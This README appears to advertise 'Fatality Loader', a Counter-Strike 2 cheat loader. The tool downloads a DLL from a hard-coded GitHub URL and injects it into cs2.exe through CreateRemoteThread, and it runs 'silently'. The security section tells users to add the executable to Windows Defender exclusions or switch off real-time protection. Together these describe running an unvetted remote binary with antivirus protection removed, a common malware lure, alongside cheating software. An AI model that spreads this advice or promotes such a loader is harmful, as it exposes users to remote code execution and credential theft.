# Fatality Loader

A modern, sleek DLL loader for Counter-Strike 2 with a clean WPF interface inspired by the original Fatality cheat loader.

![Fatality Loader](https://img.shields.io/badge/Platform-Windows-blue) ![.NET](https://img.shields.io/badge/.NET-8.0-purple) ![Build](https://img.shields.io/badge/Build-Passing-brightgreen)

## ✨ Features

- **Modern UI Design**: Clean, dark-themed interface with glitch effects and smooth animations
- **Automatic Download**: Fetches the latest DLL from a remote source
- **LoadLibrary Injection**: Reliable DLL injection via standard Windows APIs
- **Real-time Status**: Visual feedback for download and injection progress
- **Self-Contained Build**: Single executable with embedded .NET runtime (no dependencies required)
- **Silent Operation**: No intrusive message boxes or prompts

## 🖼️ Interface

- **Header Panel**: Fatality branding with RGB glitch effect
- **Product Section**: CS2 product information with online status indicator
- **Changelog**: Displays recent updates and patches
- **Subscription Info**: Shows license expiration and last update time
- **Action Buttons**: Clean exit and load buttons with hover effects

## 🔧 Technical Details

- **Framework**: WPF (.NET 8.0)
- **Language**: C#
- **Injection Method**: LoadLibrary via `CreateRemoteThread`
- **Target Process**: `cs2.exe`
- **Build Type**: Self-contained single-file executable

## 📦 Building

### Prerequisites
- [.NET 8.0 SDK](https://dotnet.microsoft.com/download/dotnet/8.0)
- Visual Studio 2022 (optional, for IDE support)

### Build Instructions

**Option 1: Command Line (Recommended)**
```powershell
dotnet publish FatalityLoader.csproj -c Release -r win-x64
```

The compiled executable will be located at:
```
bin\Release\net8.0-windows\win-x64\publish\FatalityLoader.exe
```

**Option 2: Visual Studio**
1. Open `FatalityLoader.sln`
2. Set build configuration to **Release**
3. Right-click project → **Publish**
4. Select the folder profile and publish

## 🚀 Usage

1. Ensure Counter-Strike 2 is running
2. Launch `FatalityLoader.exe`
3. Click the **Load** button
4. Wait for the "Injected!" status message

The loader will:
- Download the DLL from the configured URL
- Save it to a temporary location with a unique filename
- Inject it into the CS2 process

## ⚙️ Configuration

The DLL URL can be modified in `MainWindow.xaml.cs`:
```csharp
string dllUrl = "https://github.com/fandomuser/xz3/raw/refs/heads/main/TestDLL.dll";
```

## ⚠️ Security Notice

**Windows Defender Warning**: This application uses process injection techniques (`OpenProcess`, `WriteProcessMemory`, `CreateRemoteThread`) which are commonly flagged by antivirus software. These are legitimate Windows APIs used for DLL injection.

**To use this loader:**
- Add the executable to Windows Defender exclusions
- Or temporarily disable real-time protection

This is expected behavior for any DLL injector and does not indicate malicious code.

## 🛡️ Disclaimer

This software is provided for **educational purposes only**. Using cheats or unauthorized modifications in online games may violate the game's Terms of Service and result in account bans. The developers are not responsible for any consequences resulting from the use of this software.

Use at your own risk.

## 📝 License

This project is open-source and available under the MIT License.

## 🤝 Contributing

Contributions, issues, and feature requests are welcome! Feel free to check the issues page or write in @cs2supportbot in Telegram.

## 📧 Support

For questions or support, please open an issue on this repository or write in @cs2supportbot in Telegram.

---

**Note**: This is a fan-made replica of the Fatality loader interface. It is not affiliated with or endorsed by the original Fatality project.
